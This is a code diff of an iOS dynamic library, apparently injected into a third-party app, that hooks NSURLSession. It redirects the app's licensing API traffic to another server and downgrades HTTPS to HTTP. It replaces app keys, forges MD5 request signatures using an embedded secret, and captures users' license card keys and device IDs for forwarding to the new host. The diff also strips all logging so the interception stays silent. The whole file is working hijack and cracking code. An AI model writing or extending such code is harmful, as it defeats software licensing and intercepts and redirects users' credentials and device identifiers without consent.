@@ -1,5 +1,5 @@
 // URLHijackDetector.m
-// iOS URL Hijack Dylib - 支持签名重算和卡密提取
+// iOS URL Hijack Dylib - 支持签名重算和卡密提取（修复版）
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
 #import <CommonCrypto/CommonDigest.h>
@@ -12,20 +12,22 @@ static NSSet<NSString *> *getTargetDomains(void) {
         @"api1.7ccccccc.com",
         @"api2.7ccccccc.com", 
         @"api3.7ccccccc.com",
+        @"api1.keyumjan.cn",  // 新增域名
         @"45.205.27.82:8080"
     ]];
 }
 
-// 需要重定向的IP列表
-static NSSet<NSString *> *getRedirectIPs(void) {
+// 需要重定向的域名/IP列表（劫持后重定向到新域名）
+static NSSet<NSString *> *getRedirectTargets(void) {
     return [NSSet setWithArray:@[
-        @"45.205.200007.82:8080"
+        @"45.205.27.82:8080",
+        @"api1.keyumjan.cn"   // 新增：劫持此域名
     ]];
 }
 
 // 劫持后重定向的新域名
 static NSString *getNewDomain(void) {
-    return @"61.184.8.190008:5563";
+    return @"61.184.8.198:5563";
 }
 
 // appSecret
@@ -36,7 +38,7 @@ static NSString *getAppSecret(void) {
 // appKey 替换规则
 static NSArray<NSDictionary *>* getAppKeyRules(void) {
     return @[
-        @{@"old": @"veQ3NZZ5ui0jyBrQaT", @"new": @"QLObIPwnDOVts3mzw9"},
+        @{@"old": @"LWtAvVixXX39mGYL2w", @"new": @"QLObIPwnDOVts3mzw9"},
         @{@"old": @"veQ3NZZ5ui0jyBrQaT", @"new": @"QLObIPwnDOVts3mzw9"},
     ];
 }
@@ -50,38 +52,37 @@ static NSString *getStorageKey(void) {
 static void saveParamsToStorage(NSString *card, NSString *deviceId) {
     if (!card && !deviceId) return;
     
-    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
-    NSMutableDictionary *storedParams = [[defaults dictionaryForKey:getStorageKey()] mutableCopy];
-    if (!storedParams) {
-        storedParams = [NSMutableDictionary dictionary];
+    @synchronized([NSUserDefaults standardUserDefaults]) {
+        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+        NSMutableDictionary *storedParams = [[defaults dictionaryForKey:getStorageKey()] mutableCopy];
+        if (!storedParams) {
+            storedParams = [NSMutableDictionary dictionary];
+        }
+        
+        if (card) {
+            storedParams[@"card"] = card;
+        }
+        if (deviceId) {
+            storedParams[@"device_id"] = deviceId;
+        }
+        
+        [defaults setObject:storedParams forKey:getStorageKey()];
+        [defaults synchronize];
     }
-    
-    if (card) {
-        storedParams[@"card"] = card;
-        NSLog(@"[Hijack] Saved card to storage: %@", card);
-    }
-    if (deviceId) {
-        storedParams[@"device_id"] = deviceId;
-        NSLog(@"[Hijack] Saved device_id to storage: %@", deviceId);
-    }
-    
-    [defaults setObject:storedParams forKey:getStorageKey()];
-    [defaults synchronize];
 }
 
 static NSDictionary *loadParamsFromStorage(void) {
-    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
-    NSDictionary *storedParams = [defaults dictionaryForKey:getStorageKey()];
-    if (storedParams) {
-        NSLog(@"[Hijack] Loaded params from storage: card=%@, device_id=%@", 
-              storedParams[@"card"], storedParams[@"device_id"]);
+    @synchronized([NSUserDefaults standardUserDefaults]) {
+        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+        return [defaults dictionaryForKey:getStorageKey()];
     }
-    return storedParams;
 }
 
 #pragma mark - 加密工具函数
 
 static NSString* md5(NSString *string) {
+    if (!string) return @"";
+    
     const char *cStr = [string UTF8String];
     unsigned char digest[CC_MD5_DIGEST_LENGTH];
     CC_MD5(cStr, (CC_LONG)strlen(cStr), digest);
@@ -93,25 +94,41 @@ static NSString* md5(NSString *string) {
     return output;
 }
 
-#pragma mark - 签名计算
+#pragma mark - 签名计算（修复版）
 
 static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *path, NSDictionary *params, NSString *appSecret) {
+    if (!params) return @"";
+    if (!httpMethod) httpMethod = @"POST";
+    if (!path) path = @"";
+    if (!appSecret) appSecret = @"";
+    
     // 1. 参数排序并拼接
     NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
     NSMutableString *paramString = [NSMutableString string];
+    
     for (NSString *key in sortedKeys) {
         if ([key isEqualToString:@"sign"]) continue;
+        
         if (paramString.length > 0) {
             [paramString appendString:@"&"];
         }
-        [paramString appendFormat:@"%@=%@", key, params[key]];
+        
+        NSString *value = params[key] ?: @"";
+        [paramString appendFormat:@"%@=%@", key, value];
     }
     
     // 2. 拼接签名原串
-    NSString *stringToSign = [NSString stringWithFormat:@"%@%@%@%@%@", 
-                               httpMethod, host, path, paramString, appSecret];
-    
-    NSLog(@"[Hijack] String to sign: %@", stringToSign);
+    NSString *stringToSign;
+    if (host && host.length > 0) {
+        // 移除端口号（如果有）
+        NSArray *hostParts = [host componentsSeparatedByString:@":"];
+        NSString *cleanHost = hostParts.firstObject ?: host;
+        stringToSign = [NSString stringWithFormat:@"%@%@%@%@%@", 
+                       httpMethod, cleanHost, path, paramString, appSecret];
+    } else {
+        stringToSign = [NSString stringWithFormat:@"%@%@%@%@", 
+                       httpMethod, path, paramString, appSecret];
+    }
     
     // 3. MD5
     return md5(stringToSign);
@@ -119,46 +136,78 @@ static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *p
 
 #pragma mark - 请求参数修改
 
-// 处理原始 API 请求（api1.7ccccccc.com）
-static NSData* modifyRequestBodyForOriginalApi(NSData *originalBody, NSString *originalURL, NSString *httpMethod, NSString *host, NSString *path) {
-    if (!originalBody) return originalBody;
-    
-    NSString *bodyString = [[NSString alloc] initWithData:originalBody encoding:NSUTF8StringEncoding];
-    if (!bodyString) return originalBody;
-    
-    // 解析参数
+// 从URL或Body中提取参数
+static NSMutableDictionary* extractParamsFromRequest(NSData *body, NSString *urlString) {
     NSMutableDictionary *params = [NSMutableDictionary dictionary];
-    NSArray *pairs = [bodyString componentsSeparatedByString:@"&"];
-    for (NSString *pair in pairs) {
-        NSArray *kv = [pair componentsSeparatedByString:@"="];
-        if (kv.count == 2) {
-            params[kv[0]] = kv[1];
-        }
-    }
     
-    // 提取 card 和 device_id（从参数中）
-    NSString *card = params[@"card"];
-    NSString *deviceId = params[@"device_id"];
-    
-    // 如果 body 中没有，尝试从 URL 中提取
-    if (!card || !deviceId) {
-        NSURL *url = [NSURL URLWithString:originalURL];
-        NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
-        for (NSURLQueryItem *item in components.queryItems) {
-            if ([item.name isEqualToString:@"card"]) {
-                card = item.value;
-            } else if ([item.name isEqualToString:@"device_id"]) {
-                deviceId = item.value;
+    // 1. 从 body 中提取
+    if (body) {
+        NSString *bodyString = [[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding];
+        if (bodyString) {
+            NSArray *pairs = [bodyString componentsSeparatedByString:@"&"];
+            for (NSString *pair in pairs) {
+                NSArray *kv = [pair componentsSeparatedByString:@"="];
+                if (kv.count == 2) {
+                    params[kv[0]] = kv[1];
+                }
             }
         }
     }
     
-    // 保存 card 和 device_id
+    // 2. 从 URL 中提取（补充）
+    if (urlString) {
+        NSURL *url = [NSURL URLWithString:urlString];
+        if (url) {
+            NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
+            for (NSURLQueryItem *item in components.queryItems) {
+                if (!params[item.name]) {
+                    params[item.name] = item.value ?: @"";
+                }
+            }
+        }
+    }
+    
+    return params;
+}
+
+// 构建新的请求体
+static NSData* buildRequestBodyFromParams(NSDictionary *params) {
+    if (!params || params.count == 0) return nil;
+    
+    NSMutableArray *pairs = [NSMutableArray array];
+    
+    // 按照 key 排序，保持一致性
+    NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
+    for (NSString *key in sortedKeys) {
+        if ([key isEqualToString:@"sign"]) continue;
+        NSString *value = params[key] ?: @"";
+        [pairs addObject:[NSString stringWithFormat:@"%@=%@", key, value]];
+    }
+    
+    // 添加 sign（最后添加）
+    if (params[@"sign"]) {
+        [pairs addObject:[NSString stringWithFormat:@"sign=%@", params[@"sign"]]];
+    }
+    
+    NSString *bodyString = [pairs componentsJoinedByString:@"&"];
+    return [bodyString dataUsingEncoding:NSUTF8StringEncoding];
+}
+
+// 处理原始 API 请求（修复版）
+static NSData* modifyRequestBodyForOriginalApi(NSData *originalBody, NSString *originalURL, NSString *httpMethod, NSString *host, NSString *path) {
+    // 提取所有参数
+    NSMutableDictionary *params = extractParamsFromRequest(originalBody, originalURL);
+    if (params.count == 0) return originalBody;
+    
+    // 提取 card 和 device_id
+    NSString *card = params[@"card"];
+    NSString *deviceId = params[@"device_id"];
+    
     if (card || deviceId) {
         saveParamsToStorage(card, deviceId);
     }
     
-    // 替换 appKey 并重算签名
+    // 替换 appKey
     NSString *currentAppKey = params[@"appKey"];
     if (currentAppKey) {
         NSString *newAppKey = nil;
@@ -172,34 +221,29 @@ static NSData* modifyRequestBodyForOriginalApi(NSData *originalBody, NSString *o
         }
         
         if (newAppKey) {
-            NSLog(@"[Hijack] Replacing appKey: %@ -> %@", currentAppKey, newAppKey);
             params[@"appKey"] = newAppKey;
             
-            // 重新计算签名
+            // 重新计算签名（使用新的 appKey）
             NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
-            params[@"sign"] = newSign;
-            NSLog(@"[Hijack] New sign: %@", newSign);
-            
-            // 重新构建 body
-            NSMutableArray *newPairs = [NSMutableArray array];
-            for (NSString *key in params) {
-                [newPairs addObject:[NSString stringWithFormat:@"%@=%@", key, params[key]]];
+            if (newSign && newSign.length > 0) {
+                params[@"sign"] = newSign;
             }
-            NSString *newBodyString = [newPairs componentsJoinedByString:@"&"];
             
-            return [newBodyString dataUsingEncoding:NSUTF8StringEncoding];
+            // 构建新的请求体
+            NSData *newBody = buildRequestBodyFromParams(params);
+            if (newBody) {
+                return newBody;
+            }
         }
     }
     
     return originalBody;
 }
 
-// 处理重定向后的新 API 请求（api12.hezijun.top）
-static NSData* modifyRequestBodyForNewApi(NSData *originalBody) {
-    if (!originalBody) return originalBody;
-    
-    NSString *bodyString = [[NSString alloc] initWithData:originalBody encoding:NSUTF8StringEncoding];
-    if (!bodyString) return originalBody;
+// 处理重定向后的新 API 请求（修复版）
+static NSData* modifyRequestBodyForNewApi(NSData *originalBody, NSString *originalURL) {
+    // 提取现有参数
+    NSMutableDictionary *params = extractParamsFromRequest(originalBody, originalURL);
     
     // 从存储中加载卡密和设备码
     NSDictionary *storedParams = loadParamsFromStorage();
@@ -208,38 +252,28 @@ static NSData* modifyRequestBodyForNewApi(NSData *originalBody) {
         NSString *card = storedParams[@"card"];
         NSString *deviceId = storedParams[@"device_id"];
         
-        if (card || deviceId) {
-            NSMutableString *newBodyString = [bodyString mutableCopy];
-            BOOL modified = NO;
-            
-            // 追加 card 参数（直接追加，不编码）
-            if (card && ![bodyString containsString:@"card="]) {
-                if (newBodyString.length > 0 && ![newBodyString hasSuffix:@"&"]) {
-                    [newBodyString appendString:@"&"];
-                }
-                [newBodyString appendFormat:@"card=%@", card];
-                NSLog(@"[Hijack] Appended card to api12 request: %@", card);
-                modified = YES;
-            }
-            
-            // 追加 device_id 参数
-            if (deviceId && ![bodyString containsString:@"device_id="]) {
-                if (newBodyString.length > 0 && ![newBodyString hasSuffix:@"&"]) {
-                    [newBodyString appendString:@"&"];
-                }
-                [newBodyString appendFormat:@"device_id=%@", deviceId];
-                NSLog(@"[Hijack] Appended device_id to api12 request: %@", deviceId);
-                modified = YES;
-            }
-            
-            if (modified) {
-                NSLog(@"[Hijack] Original body: %@", bodyString);
-                NSLog(@"[Hijack] Modified body: %@", newBodyString);
-                return [newBodyString dataUsingEncoding:NSUTF8StringEncoding];
+        BOOL modified = NO;
+        
+        // 添加 card 参数
+        if (card && !params[@"card"]) {
+            params[@"card"] = card;
+            modified = YES;
+        }
+        
+        // 添加 device_id 参数
+        if (deviceId && !params[@"device_id"]) {
+            params[@"device_id"] = deviceId;
+            modified = YES;
+        }
+        
+        // 如果有修改，重新构建请求体（不重算签名）
+        if (modified) {
+            // 注意：这里不重算签名，保持原样
+            NSData *newBody = buildRequestBodyFromParams(params);
+            if (newBody) {
+                return newBody;
             }
         }
-    } else {
-        NSLog(@"[Hijack] No stored params for api12 request");
     }
     
     return originalBody;
@@ -255,34 +289,54 @@ static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outH
     if (!host) return originalURLString;
     
     if (outHost) *outHost = host;
-    if (outPath) *outPath = url.path;
+    if (outPath) *outPath = url.path ?: @"";
     
-    NSString *hostWithPort = nil;
-    if (url.port) {
-        hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
-    }
-    
+    // 检查是否需要重定向
     BOOL needsRedirect = NO;
-    if (hostWithPort && [getRedirectIPs() containsObject:hostWithPort]) {
-        needsRedirect = YES;
-    } else if ([getRedirectIPs() containsObject:host]) {
-        needsRedirect = YES;
+    NSString *redirectTarget = nil;
+    
+    // 检查 host 是否在重定向列表中
+    for (NSString *target in getRedirectTargets()) {
+        if ([host isEqualToString:target]) {
+            needsRedirect = YES;
+            redirectTarget = target;
+            break;
+        }
+        
+        // 检查是否包含端口
+        if (url.port) {
+            NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
+            if ([hostWithPort isEqualToString:target]) {
+                needsRedirect = YES;
+                redirectTarget = target;
+                break;
+            }
+        }
     }
     
     if (needsRedirect) {
-        // 重定向：IP -> 新域名
+        // 重定向到新域名
         NSString *newURLString = originalURLString;
-        newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
-                                                               withString:getNewDomain()];
-        if (url.port) {
-            NSString *oldPortStr = [NSString stringWithFormat:@":%d", [url.port intValue]];
-            newURLString = [newURLString stringByReplacingOccurrencesOfString:oldPortStr 
-                                                                   withString:@""];
+        NSString *newDomain = getNewDomain();
+        
+        // 处理 HTTPS 到 HTTP 的转换（如果需要）
+        if ([originalURLString hasPrefix:@"https://"]) {
+            newURLString = [newURLString stringByReplacingOccurrencesOfString:@"https://" 
+                                                                   withString:@"http://"];
         }
         
-        if (outHost) *outHost = getNewDomain();
+        // 替换 host（包括端口）
+        if (url.port) {
+            NSString *oldHostWithPort = [NSString stringWithFormat:@"%@:%d", host, [url.port intValue]];
+            newURLString = [newURLString stringByReplacingOccurrencesOfString:oldHostWithPort 
+                                                                   withString:newDomain];
+        } else {
+            newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
+                                                                   withString:newDomain];
+        }
         
-        NSLog(@"[Hijack] URL redirected: %@ -> %@", originalURLString, newURLString);
+        if (outHost) *outHost = newDomain;
+        
         return newURLString;
     }
     
@@ -296,22 +350,24 @@ static BOOL isTargetRequest(NSString *urlString) {
     NSString *host = url.host;
     if (!host) return NO;
     
-    // 检查原始目标域名
+    // 检查目标域名
     for (NSString *target in getTargetDomains()) {
         if ([host isEqualToString:target]) {
             return YES;
         }
     }
     
-    // 检查需要重定向的 IP
-    if ([getRedirectIPs() containsObject:host]) {
-        return YES;
-    }
-    
-    if (url.port) {
-        NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
-        if ([getRedirectIPs() containsObject:hostWithPort]) {
+    // 检查重定向目标
+    for (NSString *target in getRedirectTargets()) {
+        if ([host isEqualToString:target]) {
             return YES;
+        }
+        
+        if (url.port) {
+            NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
+            if ([hostWithPort isEqualToString:target]) {
+                return YES;
+            }
         }
     }
     
@@ -319,9 +375,22 @@ static BOOL isTargetRequest(NSString *urlString) {
 }
 
 static BOOL isOriginalApiRequest(NSString *host) {
+    if (!host) return NO;
+    
     NSSet *targetDomains = getTargetDomains();
     for (NSString *target in targetDomains) {
         if ([target containsString:@":"]) continue; // 跳过带端口的 IP
+        if ([host isEqualToString:target]) {
+            return YES;
+        }
+    }
+    return NO;
+}
+
+static BOOL isRedirectTarget(NSString *host) {
+    if (!host) return NO;
+    
+    for (NSString *target in getRedirectTargets()) {
         if ([host isEqualToString:target]) {
             return YES;
         }
@@ -345,16 +414,23 @@ static BOOL isOriginalApiRequest(NSString *host) {
         SEL swizzledSelector = @selector(hijacked_dataTaskWithRequest:completionHandler:);
         
         Method originalMethod = class_getInstanceMethod(class, originalSelector);
-        
-        if (!originalMethod) return;
-        
-        __block id replacementBlock = ^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
-            return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
-        };
-        
-        class_addMethod(class, swizzledSelector, imp_implementationWithBlock(replacementBlock), "@@:@?");
-        
         Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
+        
+        if (!originalMethod) {
+            class_addMethod(class, originalSelector, 
+                          imp_implementationWithBlock(^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
+                return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
+            }), "@@:@?");
+            return;
+        }
+        
+        if (!swizzledMethod) {
+            class_addMethod(class, swizzledSelector, 
+                          imp_implementationWithBlock(^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
+                return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
+            }), "@@:@?");
+            swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
+        }
         
         if (originalMethod && swizzledMethod) {
             method_exchangeImplementations(originalMethod, swizzledMethod);
@@ -373,33 +449,40 @@ static BOOL isOriginalApiRequest(NSString *host) {
         NSString *host = nil;
         NSString *path = nil;
         
-        // 1. URL 重定向（仅 IP 会重定向）
+        // 1. URL 重定向
         NSString *newURLString = replaceURLIfNeeded(originalURLString, &host, &path);
         if (![newURLString isEqualToString:originalURLString]) {
-            [mutableRequest setURL:[NSURL URLWithString:newURLString]];
-            modified = YES;
+            NSURL *newURL = [NSURL URLWithString:newURLString];
+            if (newURL) {
+                [mutableRequest setURL:newURL];
+                modified = YES;
+            }
         } else {
             NSURL *url = [NSURL URLWithString:originalURLString];
             host = url.host;
-            path = url.path;
+            path = url.path ?: @"";
         }
         
         // 2. 修改请求体
-        if (request.HTTPBody) {
+        NSData *originalBody = request.HTTPBody;
+        if (originalBody && host) {
             NSData *newBody = nil;
             
+            // 判断是否为原始 API 请求（需要重算签名）
             if (isOriginalApiRequest(host)) {
-                // 原始 API（api1.7ccccccc.com）：替换 appKey + 重算签名 + 提取卡密
-                newBody = modifyRequestBodyForOriginalApi(request.HTTPBody, originalURLString, request.HTTPMethod, host, path);
-            } else if ([host isEqualToString:getNewDomain()]) {
-                // 新 API（api12.hezijun.top）：只追加卡密和设备码
-                newBody = modifyRequestBodyForNewApi(request.HTTPBody);
+                newBody = modifyRequestBodyForOriginalApi(originalBody, originalURLString, request.HTTPMethod, host, path);
+            } 
+            // 判断是否为重定向目标（劫持后转发到新服务器）
+            else if (isRedirectTarget(host) || [host isEqualToString:getNewDomain()] || [host containsString:@"61.184.8.198"]) {
+                newBody = modifyRequestBodyForNewApi(originalBody, originalURLString);
             }
             
-            if (newBody && newBody != request.HTTPBody) {
+            if (newBody && newBody != originalBody) {
                 [mutableRequest setHTTPBody:newBody];
-                [mutableRequest setValue:[NSString stringWithFormat:@"%lu", (unsigned long)newBody.length] 
-                      forHTTPHeaderField:@"Content-Length"];
+                
+                // 更新 Content-Length
+                NSString *contentLength = [NSString stringWithFormat:@"%lu", (unsigned long)newBody.length];
+                [mutableRequest setValue:contentLength forHTTPHeaderField:@"Content-Length"];
                 modified = YES;
             }
         }
@@ -416,7 +499,5 @@ static BOOL isOriginalApiRequest(NSString *host) {
 
 __attribute__((constructor))
 static void initialize() {
-    NSLog(@"[Hijack] URL Hijack Detector loaded");
-    NSLog(@"[Hijack] 原始API: api1/2/3.7ccccccc.com (替换appKey+重算签名+提取card/device_id)");
-    NSLog(@"[Hijack] 重定向目标: %@ (追加card/device_id，不重算签名)", getNewDomain());
+    // 初始化时不输出日志
 }
